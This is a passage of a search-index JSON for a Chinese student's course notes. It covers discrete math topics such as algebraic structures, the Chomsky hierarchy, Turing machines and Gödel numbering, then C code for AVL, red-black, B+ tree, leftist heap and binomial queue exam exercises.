\u662f\u963f\u8d1d\u5c14\u7fa4 <li> \u662f\u534a\u7fa4 <li> <ul> <li>\u5bf9 + \u53ef\u5206\u914d\uff1aa*(b+c) = (a*b)+(a*c)\uff0c(b+c)*a = (b*a)+(c*a)</li> </ul> </li> <li> <p>\u4ee3\u6570\u7ed3\u6784  \u662f\u4e00\u4e2a \u57df\uff08field\uff09\uff0c\u5982\u679c\u5b83\u6ee1\u8db3\uff1a <li> <p> \u662f\u73af <li> \u662f\u963f\u8d1d\u5c14\u7fa4","tags":["DMPT","notes"]},{"location":"note/cs70/18-Misc/#_17","title":"\u540c\u6784","text":"","tags":["DMPT","notes"]},{"location":"note/cs70/18-Misc/#homomorphism","title":"\u540c\u6001\u6620\u5c04(homomorphism)","text":"<ul> <li> <p>\u5355\u4e00\u540c\u6001\uff1a\u5982\u5bf9\u4e8e  \u548c  \uff0c\u5b58\u5728\u5355\u4e00\u540c\u6001\u6620\u5c04 \\(f(x)=2^{x}\\) \u6709 \\(f(x+y)=2^{x+y}=2^x*2^y=f(x)*f(y)\\)\uff1b\u5982\u679c\u540e\u8005\u6539\u4e3a \\(&lt;R^{+},*&gt;\\) \uff0c\u5219\u4e3a\u540c\u6784\u6620\u5c04\uff0c\u4e24\u4e2a\u4ee3\u6570\u7ed3\u6784\u662f\u540c\u6784\u7684 <li> <p>\u6ee1\u540c\u6001 \uff1a\u5982\u8ba1\u7b97\u5b57\u7b26\u4e32\u957f\u5ea6\u7684 strlen \u51fd\u6570</p> </li>","tags":["DMPT","notes"]},{"location":"note/cs70/18-Misc/#_18","title":"\u540c\u4f59\u5173\u7cfb","text":"<p>Attention</p> <p>\u5224\u65ad\u4e00\u4e2a\u4ee3\u6570\u7ed3\u6784\u662f\u4ec0\u4e48\uff08\u671f\u672b\u5fc5\u8003\uff09</p> <p>^11f963</p> <p> </p>","tags":["DMPT","notes"]},{"location":"note/cs70/18-Misc/#ppt_3","title":"\u5f62\u5f0f\u7cfb\u7edf\uff08\u7b2c\u5341\u4e09\u3001\u56db\u8bfe PPT\uff09","text":"<p>\u9012\u5f52\u5b9a\u4e49\uff1a</p> <p></p> <p></p> <p></p> <p></p> <p>Note</p> <p>\u8bed\u6cd5\u5206\u7c7b</p> <p>\u82e5\uff1aA \u4e3a\u975e\u7ec8\u7ed3\u7b26\uff0cabc \u4e3a\u4efb\u610f\u5b57\u7b26\u4e32\u4e14 c \u4e0d\u4e3a\u7a7a\u4e32</p> <ul> <li> <p>0 \u578b\u8bed\u8a00 \uff1a\u5bf9\u4ea7\u751f\u5f0f\u6ca1\u6709\u4efb\u4f55\u7ea6\u675f\uff08\u65e0\u9650\u5236\uff09</p> <ul> <li>PSG\uff1aPhrase Structure Grammar</li> <li>\u4ea7\u751f\u9012\u5f52\u53ef\u679a\u4e3e\u8bed\u8a00</li> <li>\u88ab\u56fe\u7075\u673a\u8bc6\u522b</li> </ul> </li> <li> <p>1 \u578b\u8bed\u8a00 \uff1a\u6240\u6709\u4ea7\u751f\u5f0f\u5f62\u5982 <code>aAb \u22a2 acb</code> \uff08A \u662f\u975e\u7ec8\u7ed3\u7b26\uff0ca\uff0cb\uff0cc \u662f\u4efb\u610f\u4e32\uff0c\u4f46 c \u4e0d\u80fd\u4e3a\u7a7a\u4e32\uff09</p> <ul> <li>CSG\uff1aContext Sensitive Grammar</li> <li>\u4ea7\u751f\u4e0a\u4e0b\u6587\u76f8\u5173\u8bed\u8a00</li> <li>\u88ab\u7ebf\u6027\u6709\u754c\u81ea\u52a8\u673a\u8bc6\u522b</li> </ul> </li> <li> <p>2 \u578b\u8bed\u8a00 \uff1a\u6240\u6709\u4ea7\u751f\u5f0f\u5de6\u90e8\u662f\u4e00\u4e2a\u975e\u7ec8\u7ed3\u7b26\uff0c\u5f62\u5982 <code>A \u22a2 b</code></p> <ul> <li>CFG\uff1aContext Free Grammar</li> <li>\u4ea7\u751f\u4e0a\u4e0b\u6587\u65e0\u5173\u8bed\u8a00</li> <li>\u88ab\u4e0b\u63a8\u81ea\u52a8\u673a\u8bc6\u522b</li> <li>\u4e3a\u5927\u591a\u6570\u7a0b\u5e8f\u8bbe\u8ba1\u8bed\u8a00\u7684\u8bed\u6cd5\u63d0\u4f9b\u7406\u8bba\u57fa\u7840</li> </ul> </li> <li> <p>3 \u578b\u8bed\u8a00 \uff1a\u6240\u6709\u4ea7\u751f\u5f0f\u5de6\u90e8\u662f\u4e00\u4e2a\u975e\u7ec8\u7ed3\u7b26\uff0c\u53f3\u90e8\u6700\u591a\u4e00\u4e2a\u975e\u7ec8\u7ed3\u7b26\uff0c\u4e14\u53ea\u80fd\u5728\u6700\u53f3\u7aef</p> <ul> <li>RG\uff1aRegular Grammar</li> <li>\u4ea7\u751f\u6b63\u5219\u8bed\u8a00</li> <li>\u88ab\u6709\u9650\u72b6\u6001\u81ea\u52a8\u673a\u8bc6\u522b</li> <li>\u53ef\u4ee5\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\u8868\u793a</li> <li>Kleen \u5b9a\u7406\uff1a\u5b57\u6bcd\u8868 A \u4e0a\u7684\u5f62\u5f0f\u8bed\u8a00 L \u662f\u6b63\u5219\u7684\u5f53\u4e14\u4ec5\u5f53\u5b58\u5728\u4e00\u4e2a\u6709\u9650\u72b6\u6001\u673a M \u4f7f\u5f97 L=L(M)</li> </ul> </li> </ul> <p>\u6ee1\u8db3\uff1aL3 \u2282 L2 \u2282 L1 \u2282 L0</p> <p>^c97dab</p> <p>\u4e0a\u9762\u6240\u63d0\u5230\u7684 <code>\u8bc6\u522b</code> \u5c31\u662f\uff1a</p> <p></p> <p>BNF\uff08Backus-Naur Form\uff09\u8303\u5f0f :</p> <p> </p> <p></p> <p></p> <p> </p> <p>\u4e0b\u9762\u662f\u4e00\u4e9b\u4f8b\u5b50\uff1a </p> <p> </p> <p>\u72b6\u6001\u8f6c\u79fb\u5c31\u662f\u6839\u636e\u5f53\u524d\u72b6\u6001\u548c\u5f53\u524d\u8f93\u5165\u51b3\u5b9a\u4e0b\u4e00\u72b6\u6001\uff0c\u6211\u4eec\u5728 sys1 \u4e2d\u5b8c\u6210\u4e86\u6709\u9650\u72b6\u6001\u81ea\u52a8\u673a(FSM)\uff0c\u5e94\u8be5\u662f\u80fd\u591f\u6bd4\u8f83\u597d\u7406\u89e3\u7684\uff1b\u4f46\u662f\u6682\u65f6\u8fd8\u6ca1\u6709\u505a\u7b14\u8bb0\uff0c\u90a3\u91cc\u80fd\u591f\u5e2e\u6211\u4eec\u66f4\u597d\u5730\u53bb\u5b66\u4e60\uff0c\u7b49\u540e\u9762\u6765\u8865\u9f50\uff08 \u6316\u5751 \uff09</p> <p> </p> <p> </p> <p></p> <p> </p> <p>Hint</p> <p>M \u8868\u793a\u516d\u5143\u7ec4\u6709\u9650\u72b6\u6001\u673a\uff0c\u800c\u5728\u72b6\u6001(state)\u96c6\u5408\u4e2d\uff0cc \u8868\u793a carry\uff08\u6267\u884c\uff0c\u6216\u8005\u53ef\u4ee5\u8ba4\u4e3a\u662f\u8fdb\u4f4d\uff09\uff0cn \u548c s \u5f88\u597d\u7406\u89e3\uff0c\u56fe\u4e2d\u7ea2\u8272\u5b57\u8868\u793a\u5bf9\u5e94\u7684\u8f93\u51fa</p>","tags":["DMPT","notes"]},{"location":"note/cs70/18-Misc/#quotient-machine","title":"\u673a\u5668\u540c\u4f59 =&gt; \u5546\u673a\u5668(quotient machine)","text":"<p>Help</p> <p>\u56de\u60f3\u4ee3\u6570\u7cfb\u7edf\u4e2d\u7684\u540c\u4f59\u5173\u7cfb \uff0c\u6709\u9650\u72b6\u6001\u673a\u4e2d\u7684 Equivalent State\uff1b\u673a\u5668\u540c\u4f59\u4f5c\u4e3a\u7b49\u4ef7\u5173\u7cfb R\uff0c\u81ea\u7136\u5229\u7528\u4e86\u7b49\u4ef7\u72b6\u6001\u5c06\u4e00\u90e8\u5206\u72b6\u6001\u5408\u5e76\u4e86\uff1b\u5728\u6709\u5411\u56fe\u4e2d\uff0c\u5c31\u597d\u6bd4\u56fe\u7684\u8282\u70b9\u548c\u8fb9\u51cf\u5c11\u4e86\uff08\u6240\u4ee5\u5546\u673a\u5668\u6bd4\u539f\u673a\u5668\u7b80\u5355\uff09</p> <p>\u8fd9\u4e00\u8fc7\u7a0b\u88ab\u8ba4\u4e3a \\(S' = \\frac{S}{R}\\) \uff08\u8282\u70b9\u51cf\u5c11\uff09\uff0c\\(F'=\\{&lt;[s],[F(x,s)]&gt;|s\\in S,x\\in A\\}\\) \uff08\u8fb9\u51cf\u5c11\uff09\uff0c\u91cd\u65b0\u751f\u6210\u7684\u673a\u5668\u5c31\u53eb\u505a\u5546\u673a\u5668</p> <p></p>","tags":["DMPT","notes"]},{"location":"note/cs70/18-Misc/#r","title":"\u76f8\u878d\u5173\u7cfb R \u7684\u8fed\u4ee3\u7b97\u6cd5","text":"<p>Example</p> <p></p> <p>\u91cd\u590d\u4e0a\u8ff0\u6b65\u9aa4\u76f4\u5230\u4e0d\u80fd\u5212\u5206\uff0c\u5373\u4e3a\u5546\u673a\u5668\uff1b\u56fe\u4e2d\u7684\u6837\u4f8b\u673a\u5668\u7528\u4e8e\u5224\u65ad\u4e00\u4e2a\u4e8c\u8fdb\u5236\u6570\u80fd\u5426\u88ab 3 \u6574\u9664</p> <p></p>","tags":["DMPT","notes"]},{"location":"note/cs70/18-Misc/#_19","title":"\u5f62\u5f0f\u8bed\u8a00","text":"","tags":["DMPT","notes"]},{"location":"note/cs70/18-Misc/#phrase-structure-grammar-psg","title":"\u77ed\u8bed\u7ed3\u6784\u8bed\u6cd5\uff08Phrase Structure Grammar, PSG\uff09","text":"<ol> <li> <p>\u56db\u5143\u7ec4G=\uff1a <ul> <li>G \u4ee3\u8868\u4e00\u4e2a\u77ed\u8bed\u7ed3\u6784\u8bed\u6cd5\u7cfb\u7edf\u3002</li> <li>V \u662f\u5b57\u7b26\u96c6\uff0c\u5305\u542b\u4e86\u6240\u6709\u5728\u8bed\u6cd5\u4e2d\u4f7f\u7528\u7684\u7b26\u53f7\uff0c\u5305\u62ec\u7ec8\u7ed3\u7b26\u548c\u975e\u7ec8\u7ed3\u7b26\u3002</li> <li>S \u662f\u7ec8\u7ed3\u7b26\u96c6\u5408\uff0c\u662f V \u7684\u4e00\u4e2a\u5b50\u96c6\uff0c\u901a\u5e38\u8868\u793a\u8bcd\u6c47\u9879\uff0c\u5982\u5355\u8bcd\u3002</li> <li>N=V-S \u662f\u975e\u7ec8\u7ed3\u7b26\u96c6\u5408\uff0c\u8868\u793a\u8bed\u6cd5\u4e2d\u7684\u6784\u9020\u5757\uff0c\u5982\u77ed\u8bed\u6216\u53e5\u5b50\u6210\u5206\u3002</li> <li> <p>\u22a2\u662f\u4ea7\u751f\u5f0f\u5173\u7cfb\uff0c\u8868\u793a\u7b26\u53f7\u4e4b\u95f4\u53ef\u4ee5\u8fdb\u884c\u7684\u66ff\u6362\u89c4\u5219\u3002 2. \u4ea7\u751f\u5f0f\u5173\u7cfb\uff08\u22a2\uff09\uff1a</p> </li> <li> <p>\u4ea7\u751f\u5f0f\u662f\u77ed\u8bed\u7ed3\u6784\u8bed\u6cd5\u4e2d\u7684\u57fa\u672c\u89c4\u5219\uff0c\u5f62\u5f0f\u4e3a w \u22a2 w\u2032\uff0c\u5176\u4e2d w \u548c w\u2032\u662f\u7b26\u53f7\u4e32\u3002</p> </li> <li>w \u79f0\u4e3a\u4ea7\u751f\u5f0f\u7684\u5de6\u90e8\uff0cw\u2032\u79f0\u4e3a\u53f3\u90e8\u3002</li> <li> <p>\u8fd9\u4e2a\u5173\u7cfb\u8868\u660e\uff0c\u5de6\u90e8\u7684\u7b26\u53f7\u4e32\u53ef\u4ee5\u88ab\u53f3\u90e8\u7684\u7b26\u53f7\u4e32\u66ff\u6362\u3002 3. \u521d\u59cb\u7b26 v0\uff1a</p> </li> <li> <p>v0 \u5c5e\u4e8e\u975e\u7ec8\u7ed3\u7b26\u96c6\u5408 N\uff0c\u662f\u8bed\u6cd5\u4e2d\u7684\u4e00\u4e2a\u7279\u5b9a\u7b26\u53f7\uff0c\u901a\u5e38\u7528\u4f5c\u8bed\u6cd5\u63a8\u5bfc\u7684\u8d77\u70b9\u3002</p> </li> <li>\u5b83\u4ee3\u8868\u4e86\u4e00\u4e2a\u5b8c\u6574\u7684\u53e5\u5b50\u6216\u66f4\u5927\u7684\u8bed\u8a00\u5355\u4f4d\u3002</li> </ul> <p></p> <p>Note</p> <p>0/1/2 \u578b\u5f62\u5f0f\u8bed\u8a00\u89c1 \u8bed\u6cd5\u5206\u7c7b</p>","tags":["DMPT","notes"]},{"location":"note/cs70/18-Misc/#_20","title":"\u56fe\u7075\u673a","text":"<p>\u6211\u4eec\u7528\u7eb8\u888b\u79fb\u52a8\u6765\u6a21\u4eff\u8bfb\u5199\u5934\u79fb\u52a8</p> <p>\u72b6\u6001\u8f6c\u79fb\u51fd\u6570\u2014\u2014\u89c4\u5219</p> <p>Note</p> <p>\u8ba1\u7b97\u89c4\u5219\u7684\u9650\u5236\uff1a - \u89c4\u5219\u6570\u91cf\u6709\u9650 - \u786e\u4fdd\u52a8\u4f5c\u786e\u5b9a\u6027\uff0c\u5373\u4efb\u610f\u4e24\u6761\u89c4\u5219\u524d\u4e24\u9879\u4e0d\u80fd\u5b8c\u5168\u76f8\u540c - \u4efb\u4f55\u89c4\u5219\u7684\u7b2c\u4e00\u9879\u4e0d\u80fd\u4e3a \\(S_{H}/S_{Y}/S_{N}\\)\uff0c\u56e0\u4e3a\u8fd9\u4e09\u4e2a\u72b6\u6001\u65f6\u5e94\u8be5\u505c\u673a</p>","tags":["DMPT","notes"]},{"location":"note/cs70/18-Misc/#_21","title":"\u8bc6\u522b\u3001\u679a\u4e3e\u548c\u5224\u5b9a","text":"","tags":["DMPT","notes"]},{"location":"note/cs70/18-Misc/#godel-numbering","title":"\u54e5\u5fb7\u5c14\u7f16\u7801\uff08G\u00f6del Numbering\uff09","text":"<ul> <li> <p>\u5c06\u4efb\u4f55\u5f62\u5f0f\u8bed\u8a00 L \u7f16\u7801\u4e3a\u81ea\u7136\u6570\u7684\u96c6\u5408</p> </li> <li> <p>\u5c06\u8bed\u8a00\u4e0a\u7684\u8fd0\u7b97\u53d8\u6362\u4e3a\u81ea\u7136\u6570\u7684\u8fd0\u7b97</p> </li> <li> <p>\u5f62\u5f0f\u7cfb\u7edf\u7684\u95ee\u9898\u53d8\u6362\u4e3a\u6570\u8bba\u95ee\u9898</p> </li> </ul>","tags":["DMPT","notes"]},{"location":"note/cs70/18-Misc/#_22","title":"\u7f16\u7801\u8fc7\u7a0b","text":"<p>\u6211\u4eec\u5728 02-Proof \u7684\u77db\u76fe\u8bc1\u660e\u4e2d\uff0c\u8bc1\u660e\u8fc7\u7d20\u6570\u6709\u65e0\u7a77\u591a\u4e2a\uff0c\u4efb\u610f\u6b63\u6574\u6570\u53ef\u552f\u4e00\u5206\u89e3\u4e3a\u82e5\u5e72\u4e2a\u7d20\u6570\u3002</p> <p></p> <p>\u5176\u4e2d p (i) \u8868\u793a\u4ece\u5c0f\u5230\u5927\u7684\u7b2c i \u4e2a\u7d20\u6570\uff08\u7531\u4e8e\u7d20\u6570\u7684\u4e2a\u6570\u662f\u65e0\u9650\u7684\uff0c\u6240\u4ee5\u5bf9\u4e8e\u4efb\u610f\u957f\u7684\u5b57\u7b26\u4e32\u90fd ok\uff09</p> <p>\u91cd\u8981\u7ed3\u8bba\uff1a\u5982\u679c\u5b57\u6bcd\u8868 A \u662f\u53ef\u6570\u7684\uff08\u53ef\u4ee5\u5bf9\u5e94\u81ea\u7136\u6570\u7684\u5b50\u96c6\uff09\uff0c\u5219 A \u4e0a\u7684\u6240\u6709\u5f62\u5f0f\u8bed\u8a00 L \u90fd\u662f\u53ef\u6570\u7684</p> <p>Example</p> <p></p> <p>\u7531\u4e8e\u4efb\u610f\u6574\u6570\u5206\u89e3\u4e3a\u7d20\u6570\u7684\u65b9\u5f0f\u662f\u552f\u4e00\u7684\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u5bf9\u4e8e\u56fa\u5b9a\u7684\u5b57\u7b26\u96c6 A\uff0c\u5b57\u7b26\u4e32 w \u4e0e\u54e5\u5fb7\u5c14\u7f16\u7801 G \u662f \u4e00\u4e00\u5bf9\u5e94 \u7684</p>","tags":["DMPT","notes"]},{"location":"note/cs70/18-Misc/#_23","title":"\u901a\u7528\u56fe\u7075\u673a","text":"<p>\u800c\u56fe\u7075\u673a\u7684\u529f\u80fd\u65e0\u975e\u5c31\u662f\u5bf9\u8f93\u5165\u8fdb\u884c\u5904\u7406\u4ee5\u8f93\u51fa\uff0c\u901a\u7528\u56fe\u7075\u673a\u662f\u5b58\u5728\u7684</p> <p></p>","tags":["DMPT","notes"]},{"location":"note/cs70/18-Misc/#_24","title":"\u505c\u673a\u95ee\u9898","text":"<p>Question</p> <p>\u662f\u5426\u6709\u7b97\u6cd5\u80fd\u591f\u5224\u5b9a\u67d0\u4e2a\u56fe\u7075\u673a M \u5728\u8f93\u5165 I \u4e0b\u662f\u5426\u505c\u673a\uff1f</p> <p>\u5426\uff0c\u505c\u673a\u95ee\u9898\u662f\u4e0d\u53ef\u8ba1\u7b97\u95ee\u9898</p>","tags":["DMPT","notes"]},{"location":"note/cs70/18-Misc/#_25","title":"\u54e5\u5fb7\u5c14\u4e0d\u5b8c\u5907\u5b9a\u7406","text":"<p>[!THEOREM ]</p> <p>G\u00f6del Incomplete Theorem </p> <p>\u4efb\u4f55\u5305\u542b\u81ea\u7136\u6570\u5b9a\u4e49\u7684\u5f62\u5f0f\u7cfb\u7edf\u90fd\u662f\u4e0d\u5b8c\u5168\u7684\uff0c\u4e5f\u5c31\u662f\u5b58\u5728\u4e0d\u80fd\u8bc1\u660e\u4e3a\u771f\u4e5f\u4e0d\u80fd\u8bc1\u660e\u4e3a\u5047\u7684\u547d\u9898</p>","tags":["DMPT","notes"]},{"location":"note/cs70/18-Misc/#_26","title":"\u6982\u7387\u8bba","text":"<p>\u4e00\u4e2a\u5f88\u597d\u7684 \u5077\u61d2\u65b9\u6cd5</p> <p>\u4e0b\u9762\u662f\u4e00\u4e9b\u770b\u8bfe\u4ef6\u8fc7\u7a0b\u4e2d\u7684\u5c0f\u7b14\u8bb0\uff1a</p> <p>\u8bc1\u660e\u6982\u7387\u72ec\u7acb\u6027</p> <p></p> <p>\u5efa\u7acb\u6982\u7387\u6a21\u578b</p> <p></p> <p>Solution</p> <p></p> <p>\u79bb\u6563\u6982\u7387\u4e0b\u7684 CDF \u56fe\u5f62</p> <p></p> <p>\u548c\u7684\u671f\u671b/\u65b9\u5dee</p> <p>\\(\\mathbb{E}\\left[W_n\\right]=\\mathbb{E}\\left[X_1\\right]+\\mathbb{E}\\left[X_2\\right]+\\cdots+\\mathbb{E}\\left[X_n\\right].\\)</p> \\[ Var[W_n]=\\sum_{i=1}^nVar[X_i]+2\\sum_{i=1}^{n-1}\\sum_{j=i+1}^nCov[X_i,X_j]=\\sum_{i=1}^n\\sum_{j=1}^nCov[X_i,X_j] \\] <p>\u5982\u679c \\(X_{i}\\) \u4e92\u4e0d\u76f8\u5173\uff0c\u5219\u6709 \\(Cov[X_{i}, X_{j}] = 0\\)\uff0c\u7ed3\u679c\u5c31\u53d8\u6210\u7ebf\u6027\u66ff\u6362\u4e86\uff1b\u4f46\u662f \\(X_{i}\\) \u548c \\(X_i\\) \u672c\u8eab\u80af\u5b9a\u76f8\u5173\uff0c\u4e0d\u7528\u62c5\u5fc3\u3002</p> <p>Central Limit Theorem</p>","tags":["DMPT","notes"]},{"location":"note/other/","title":"Other","text":"<p>\u4e00\u4e9b\u8bfe\u7a0b\u5e76\u6ca1\u80fd\u591f\u6709\u592a\u591a\u65f6\u95f4/\u6ca1\u6709\u592a\u5927\u5fc5\u8981/\u672c\u4eba\u592a\u61d2\u4e86\u800c\u6ca1\u505a\u8be6\u7ec6\u7684\u7b14\u8bb0\uff0c\u4f46\u662f\u5728\u671f\u672b\u8003\u8bd5\u51b2\u523a\u7684\u65f6\u5019\u53ef\u80fd\u6709\u4e9b\u9519\u9898\u6574\u7406\u5565\u7684\uff0c\u6240\u4ee5\u4e00\u5e76\u653e\u5728\u8fd9\u91cc\u4e86\u3002</p> <p>\u73b0\u6709\uff1a</p> other          <ul> <li> FDS-questions  2521  8 mins              1740028248 </li> <li> ADS_problems  7048  23 mins              1739624158 </li> </ul>","tags":["notes"]},{"location":"note/other/ADS_PPT/","title":"ADS PPT","text":"<p>\u4e3a\u4e86\u8003\u8bd5\uff0c\u901f\u901a PPT\uff0c\u7b80\u5355\u8bb0\u5f55\u8003\u7a0b\u5e8f\u586b\u7a7a\u4ee3\u7801\uff08\u4e5f\u6709\u4e00\u4e9b\u8003\u8fc7\u7684\u7a0b\u5e8f\u586b\u7a7a\u9898\uff09\u3002</p> <p>\u90e8\u5206\u7a0b\u5e8f\u586b\u7a7a\u9898\u7b54\u6848\u6765\u81ea HYLUZ\uff1b</p> <p>\u4e5f\u53ef\u89c1\u8fd9\u90fd\u662f\u51e0\u5e74\u524d\u7684\u9898\u76ee\uff0c\u8fd8\u5728\u7528\u8fd8\u5728\u7528\u3002</p>","tags":["notes"]},{"location":"note/other/ADS_PPT/#avl-tree","title":"AVL Tree","text":"","tags":["notes"]},{"location":"note/other/ADS_PPT/#rl_roatation","title":"RL_Roatation","text":"RL<pre><code>typedef struct TNode *Tree;\nstruct TNode {\n    int key, h;\n    Tree left, right;\n};\n\nTree RL_Rotation( Tree T )\n{\n    Tree K1, K2;\n\n    K1 = T-&gt;right;\n    K2 = K1-&gt;left;\n    K1-&gt;left = K2-&gt;right;\n    T-&gt;right = K2-&gt;left;\n    K2-&gt;right = K1;\n    K2-&gt;left=T;\n    /* Update the heights */\n    K1-&gt;h = maxh(Height(K1-&gt;left), Height(K1-&gt;right)) + 1;\n    T-&gt;h = maxh(Height(T-&gt;left), Height(T-&gt;right)) + 1;\n    K2-&gt;h = maxh(K1-&gt;h, T-&gt;h) + 1;\n\n    return K2;\n}\n</code></pre>","tags":["notes"]},{"location":"note/other/ADS_PPT/#amortized-analysis","title":"Amortized Analysis","text":"","tags":["notes"]},{"location":"note/other/ADS_PPT/#multipop","title":"MultiPop","text":"multiPop<pre><code>Algorithm(int k, Stack S){\n    while ( !IsEmpty(S) &amp;&amp; k&gt;0 ) {\n        Pop(S);\n        k--;\n    } /* end while-loop */ \n} // T = min (sizeof(S), k)\n</code></pre> <p>\u4f46\u662f\u644a\u8fd8\u4e0b\u6765 T(n) = O(n)/n = O(1)</p>","tags":["notes"]},{"location":"note/other/ADS_PPT/#red-black-tree","title":"Red-Black Tree","text":"","tags":["notes"]},{"location":"note/other/ADS_PPT/#isrbt","title":"IsRBT","text":"IsRBT<pre><code>typedef enum { red, black } colors;\ntypedef struct RBNode *PtrToRBNode;\nstruct RBNode{\n    int Data;\n    PtrToRBNode Left, Right, Parent;\n    int BlackHeight;\n    colors Color;\n};\ntypedef PtrToRBNode RBTree;\n\n// Please fill in the blanks.\nbool IsRBT( RBTree T ) {\n    int LeftBH, RightBH;\n    if ( !T ) return true;\n    if ( T-&gt;Color == black ) T-&gt;BlackHeight = 1;\n    else {\n         if ( T-&gt;Left &amp;&amp; ________) return false; // blank 1\n         if ( T-&gt;Right &amp;&amp; (T-&gt;Right-&gt;Color == red) ) return false;\n    }\n    if ( !T-&gt;Left &amp;&amp; !T-&gt;Right ) return true;\n    if (________) { // blank 2\n        if ( T-&gt;Left ) LeftBH = T-&gt;Left-&gt;BlackHeight;\n        else LeftBH = 0;\n        if ( T-&gt;Right ) RightBH = T-&gt;Right-&gt;BlackHeight;\n        else RightBH = 0;\n        if ( LeftBH == RightBH ) { \n            ________; // blank 3\n            return true;\n        }\n       else return false;\n    }\n    else return false;\n}\n// (T-&gt;Left-&gt;Color == red)\n// IsRBT( T-&gt;Left ) &amp;&amp; IsRBT( T-&gt;Right )\n// T-&gt;BlackHeight += LeftBH\n</code></pre>","tags":["notes"]},{"location":"note/other/ADS_PPT/#b-tree","title":"B+ Tree","text":"","tags":["notes"]},{"location":"note/other/ADS_PPT/#insert","title":"Insert","text":"Insert<pre><code>Btree  Insert ( ElementType X,  Btree T ) \n{ \n    Search from root to leaf for X and find the proper leaf node;\n    Insert X;\n    while ( this node has M+1 keys ) {\n            split it into 2 nodes with (M+1)/2 and (M+1)/2 keys, respectively;\n            if (this node is the root)\n                create a new root with two children;\n            check its parent;\n    }\n} // T(M,N)=O((M/logM)logN); T_Find(M,N)=O(logN)\n</code></pre>","tags":["notes"]},{"location":"note/other/ADS_PPT/#findkey","title":"FindKey","text":"FindKey<pre><code>static int order = DEFAULT_ORDER;\ntypedef struct BpTreeNode BpTreeNode;\nstruct BpTreeNode {\n    BpTreeNode** childrens; /* Pointers to childrens. This field is not used by leaf nodes. */\n    ElementType* keys;\n    BpTreeNode* parent;\n    bool isLeaf; /* 1 if this node is a leaf, or 0 if not */\n    int numKeys; /* This field is used to keep track of the number of valid keys.\n    In an internal node, the number of valid pointers is always numKeys + 1. */\n};\nbool FindKey(BpTreeNode * const root, ElementType key){\n    if (root == NULL) {\n        return false;\n    }\n    inti= 0;\n    BpTreeNode * node = root;\n    while (____) { // \u7a7a 1\n       i= 0;\n        while (i &lt; node-&gt;numKeys) {\n            if (____) i++; // \u7a7a 2\n            else break;\n        }\n        node = node-&gt;childrens[i];\n    }\n    for(i = 0;i&lt; node-&gt;numKeys; i++){\n        if(node-&gt;keys[i] == key)\n        return true;\n    }\n    return false;\n}\n// !(node-&gt;isLeaf)\n// key &gt;= node-&gt;keys[i]\n</code></pre>","tags":["notes"]},{"location":"note/other/ADS_PPT/#leftist-heap","title":"Leftist Heap","text":"leftistHeapNode<pre><code>struct TreeNode {\n    ElementType Element;\n    PriorityQueue Left;\n    PriorityQueue Right;\n    int Npl;\n};\n</code></pre>","tags":["notes"]},{"location":"note/other/ADS_PPT/#priorityq-merge","title":"priorityQ merge","text":"priorityQueue merge<pre><code>PriorityQueue Merge ( PriorityQueue H1, PriorityQueue H2 ){\n    if ( H1 == NULL ) return H2;    \n    if ( H2 == NULL ) return H1\n    // \u5c06\u8f83\u5c0f\u7684\u503c\u7684\u6839\u4f5c\u4e3a\u5408\u5e76\u540e\u7684\u6839   \n    if (H1-&gt;Element &lt; H2-&gt;Element) return Merge1( H1, H2 );\n    else return Merge1( H2, H1 );\n}\n\nstatic PriorityQueue Merge1( PriorityQueue H1, PriorityQueue H2 ) { \n    /* H1 is a single node */\n    if ( H1-&gt;Left == NULL ) H1-&gt;Left = H2;\n    /* H1-&gt;Right is already NULL and H1-&gt;Npl is already 0 */\n    else {\n        H1-&gt;Right = Merge( H1-&gt;Right, H2 );     /* Step 1 &amp; 2 */\n        if ( H1-&gt;Left-&gt;Npl &lt; H1-&gt;Right-&gt;Npl )\n            SwapChildren(H1);    /* Step 3 */\n        H1-&gt;Npl = H1-&gt;Right-&gt;Npl + 1;\n    } /* end else */\n    return H1;\n} // Tp = O(log N)\n</code></pre> <p>\u5f53\u7136\u4e5f\u53ef\u4ee5\u5408\u5e76\u4e3a\u4e00\u4e2a\uff1a</p> PriorityQueue Merge<pre><code>PriorityQueue Merge ( PriorityQueue H1, PriorityQueue H2 ){\n    if ( H1 == NULL ) return H2;    \n    if ( H2 == NULL ) return H1\n    // \u5c06\u8f83\u5c0f\u7684\u503c\u7684\u6839\u4f5c\u4e3a\u5408\u5e76\u540e\u7684\u6839   \n    if (H1-&gt;Element &lt; H2-&gt;Element)\n        swap(H1, H2);\n    /* H1 is a single node */\n    if ( H1-&gt;Left == NULL )\n        H1-&gt;Left = H2;\n    else {\n        H1-&gt;Right = Merge( H1-&gt;Right, H2 );     /* Step 1 &amp; 2 */\n        if ( H1-&gt;Left-&gt;Npl &lt; H1-&gt;Right-&gt;Npl )\n            SwapChildren(H1);    /* Step 3 */\n        H1-&gt;Npl = H1-&gt;Right-&gt;Npl + 1;\n    }\n}\n</code></pre>","tags":["notes"]},{"location":"note/other/ADS_PPT/#binomial-queues","title":"Binomial Queues","text":"","tags":["notes"]},{"location":"note/other/ADS_PPT/#implement","title":"implement","text":"BinQueue implement<pre><code>typedef struct BinNode *Position;\ntypedef struct Collection *BinQueue;\ntypedef struct BinNode *BinTree;  /* missing from p.176 */\n\nstruct BinNode { \n    ElementType Element;\n    Position LeftChild;\n    Position NextSibling;\n};\n\nstruct Collection { \n    int CurrentSize;  /* total number of nodes */\n    BinTree TheTrees[MaxTrees];\n};\n</code></pre>","tags":["notes"]},{"location":"note/other/ADS_PPT/#merge","title":"Merge","text":"BinQueue Merge<pre><code>BinQueue  Merge( BinQueue H1, BinQueue H2 )\n{    BinTree T1, T2, Carry = NULL;     \n    int i, j;\n    if ( H1-&gt;CurrentSize + H2-&gt; CurrentSize &gt; Capacity )  ErrorMessage();\n    H1-&gt;CurrentSize += H2-&gt; CurrentSize;\n    for ( i=0, j=1; j&lt;= H1-&gt;CurrentSize; i++, j*=2 ) {\n        T1 = H1-&gt;TheTrees[i]; T2 = H2-&gt;TheTrees[i]; /*current trees */\n        switch( 4*!!Carry + 2*!!T2 + !!T1 ){\n        /* \u53d8\u4e3a Carry T2 T1 \u7684\u4e09\u4f4d\u4e8c\u8fdb\u5236\u6570 */ \n        case 0: /* 000 */\n        case 1: /* 001 */  break;    \n        case 2: /* 010 */  \n            H1-&gt;TheTrees[i] = T2; H2-&gt;TheTrees[i] = NULL; break;\n        case 4: /* 100 */  \n            H1-&gt;TheTrees[i] = Carry; Carry = NULL; break;\n        case 3: /* 011 */  \n            Carry = CombineTrees( T1, T2 );\n            H1-&gt;TheTrees[i] = 